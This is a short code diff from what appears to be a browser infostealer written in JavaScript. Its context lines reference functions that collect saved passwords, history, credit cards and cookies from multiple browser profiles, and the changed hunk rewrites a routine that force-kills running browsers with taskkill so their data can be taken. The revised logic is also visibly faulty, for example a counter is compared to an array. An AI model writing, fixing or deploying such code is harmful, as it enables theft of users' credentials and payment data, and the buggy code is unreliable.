@@ -72,14 +72,14 @@ const cookies = (name, path, profile) => {
 
 const fns = { passwords, history, creditCards, cookies };
 
-const kill = (browser) => {
-  return new Promise((resolve, reject) => {
-    const tasks = execSync('tasklist');
-    if (tasks.includes(browser)) {
-      exec(`taskkill /f /im ${browser}.exe`).on('exit', resolve);
-    } else {
-      reject();
-    }
+const kill = (processes) => {
+  return new Promise((resolve) => {
+    const tasks = execSync('tasklist').toString().split('\n');
+    let i = 0;
+    processes.filter(task => tasks.includes(task)).forEach((task, index) => {
+      exec(`taskkill /f /im ${task}.exe`).on('exit', () => i = index);
+    });
+    if (i >= tasks) resolve();
   });
 };
 
@@ -92,7 +92,7 @@ kill(browsersProcesses).then(() => {
         .forEach(fn => {
           ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']
             .forEach(profile => {
-              fns[fn](browser[1].join(' '), path, profile);
+              fns[fn](browser.join(' '), path, profile);
             });
         });
     }
